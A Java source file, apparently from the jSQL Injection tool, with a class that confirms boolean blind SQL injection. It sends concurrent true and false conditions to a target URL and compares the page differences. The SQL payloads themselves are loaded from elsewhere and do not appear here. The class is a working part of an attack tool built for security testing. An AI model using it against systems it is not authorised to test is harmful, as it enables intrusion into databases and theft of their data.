package com.jsql.model.injection.strategy.blind;

import com.jsql.model.InjectionModel;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.strategy.blind.callable.AbstractCallableBit;
import com.jsql.model.injection.strategy.blind.callable.CallableCharInsertion;
import com.jsql.util.LogLevelUtil;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Future;

import static name.fraser.neil.plaintext.diff_match_patch.Diff;

/**
 * A blind attack class using concurrent threads.
 */
public class InjectionCharInsertion {
    
    private static final Logger LOGGER = LogManager.getRootLogger();

    // Source code of the FALSE web page (e.g. ?id=-123456789)
    private String blankFalseMark;

    /**
     * List of string differences found in all the FALSE queries, compared
     * to the reference page (aka opcodes). Each FALSE pages should contain
     * at least one same string, which shouldn't be present in all
     * the TRUE queries.
     */
    private List<Diff> constantTrueMark = new ArrayList<>();
    
    protected final InjectionModel injectionModel;

    private final String prefixSuffix;
    
    private static final String PREFIX = "prefix";

    private final List<String> falsy;
    
    /**
     * Create blind attack initialization.
     * If every false test are not in true mark and every true test are in
     * true test, then blind attack is confirmed.
     */
    public InjectionCharInsertion(InjectionModel injectionModel, String falseCharInsertion, String prefixSuffix) {
        this.injectionModel = injectionModel;
        this.prefixSuffix = prefixSuffix;
        
        List<String> truthy = this.injectionModel.getMediatorVendor().getVendor().instance().getTruthyBit();
        this.falsy = this.injectionModel.getMediatorVendor().getVendor().instance().getFalsyBit();
        
        // No blind
        if (truthy.isEmpty() || this.injectionModel.isStoppedByUser()) {
            return;
        }
        
        // Call the SQL request which must be FALSE (usually ?id=-123456879)
        this.blankFalseMark = this.callUrl(
            falseCharInsertion,
            "prefix:" + prefixSuffix.replace(InjectionCharInsertion.PREFIX, StringUtils.EMPTY)
        );

        // Concurrent calls to the FALSE statements,
        // it will use inject() from the model
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableCharInsertionTagTrue");
        Collection<CallableCharInsertion> listCallableTagTrue = new ArrayList<>();
        
        for (String urlTest: truthy) {
            listCallableTagTrue.add(
                new CallableCharInsertion(
                    String.join(
                        StringUtils.SPACE,
                        prefixSuffix.replace(InjectionCharInsertion.PREFIX, RandomStringUtils.secure().next(10, "345")),
                        this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getStrategy().getBinary().getModeOr(),
                        urlTest
                    ),
                    this,
                    "prefix#true"
                )
            );
        }
        
        // Delete junk from the results of FALSE statements,
        // keep only opcodes found in each and every FALSE pages.
        // Allow the user to stop the loop
        try {
            List<Future<CallableCharInsertion>> listTagTrue = taskExecutor.invokeAll(listCallableTagTrue);
            this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
            for (var i = 1 ; i < listTagTrue.size() ; i++) {
                if (this.injectionModel.isStoppedByUser()) {
                    return;
                }

                if (this.constantTrueMark.isEmpty()) {
                    this.constantTrueMark = listTagTrue.get(i).get().getOpcodes();
                } else {
                    this.constantTrueMark.retainAll(listTagTrue.get(i).get().getOpcodes());
                }
            }
        } catch (ExecutionException e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        } catch (InterruptedException e) {
            LOGGER.log(LogLevelUtil.IGNORE, e, e);
            Thread.currentThread().interrupt();
        }
        
        this.initFalseMarks();
    }
    
    private void initFalseMarks() {
        // Concurrent calls to the TRUE statements,
        // it will use inject() from the model.
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetCharInsertionTagFalse");
        Collection<CallableCharInsertion> listCallableTagFalse = new ArrayList<>();
        
        for (String urlTest: this.falsy) {
            listCallableTagFalse.add(
                new CallableCharInsertion(
                    String.join(
                        StringUtils.SPACE,
                        this.prefixSuffix.replace(InjectionCharInsertion.PREFIX, RandomStringUtils.secure().next(10, "345")),
                        this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getStrategy().getBinary().getModeOr(),
                        urlTest
                    ),
                    this,
                    "prefix#false"
                )
            );
        }
        
        // Remove TRUE opcodes in the FALSE opcodes, because
        // a significant FALSE statement shouldn't contain any TRUE opcode.
        // Allow the user to stop the loop.
        try {
            List<Future<CallableCharInsertion>> listTagFalse = taskExecutor.invokeAll(listCallableTagFalse);
            this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
        
            for (Future<CallableCharInsertion> falseTag: listTagFalse) {
                if (this.injectionModel.isStoppedByUser()) {
                    return;
                }
                this.constantTrueMark.removeAll(falseTag.get().getOpcodes());
            }
        } catch (ExecutionException e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        } catch (InterruptedException e) {
            LOGGER.log(LogLevelUtil.IGNORE, e, e);
            Thread.currentThread().interrupt();
        }
    }

    public boolean isInjectable() throws StoppedByUserSlidingException {
        if (this.injectionModel.isStoppedByUser()) {
            throw new StoppedByUserSlidingException();
        }
        var blindTest = new CallableCharInsertion(
            String.join(
                StringUtils.SPACE,
                this.prefixSuffix.replace(InjectionCharInsertion.PREFIX, RandomStringUtils.secure().next(10, "678")),
                this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getStrategy().getBinary().getModeOr(),
                this.injectionModel.getMediatorVendor().getVendor().instance().sqlBlindConfirm()
            ),
            this,
            "prefix#confirm"
        );
        try {
            blindTest.call();
        } catch (Exception e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        }
        return blindTest.isTrue() && !this.constantTrueMark.isEmpty();
    }
    
    public String callUrl(String urlString, String metadataInjectionProcess) {
        return this.injectionModel.injectWithoutIndex(urlString, metadataInjectionProcess);
    }

    public String callUrl(String urlString, String metadataInjectionProcess, AbstractCallableBit<?> callableBoolean) {
        return this.injectionModel.injectWithoutIndex(urlString, metadataInjectionProcess, callableBoolean);
    }


    // Getter

    public String getBlankFalseMark() {
        return this.blankFalseMark;
    }
    
    public List<Diff> getConstantTrueMark() {
        return this.constantTrueMark;
    }
}
